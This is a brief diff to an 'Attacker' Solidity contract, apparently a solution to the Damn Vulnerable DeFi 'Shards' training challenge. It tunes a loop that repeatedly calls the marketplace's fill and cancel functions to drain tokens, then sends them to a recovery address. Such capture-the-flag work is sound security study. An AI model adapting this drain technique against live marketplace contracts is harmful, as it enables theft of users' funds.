@@ -11,8 +11,8 @@ import {
 
 contract Attacker {
     constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
-        for (uint256 i=0; i < 1e6+1; i++) {
-            marketplace.fill(1, 1);
+        for (uint256 i=0; i < 7519; i++) {
+            marketplace.fill(1, 133);
             marketplace.cancel(1, i);
         }
         token.transfer(recovery, token.balanceOf(address(this)));
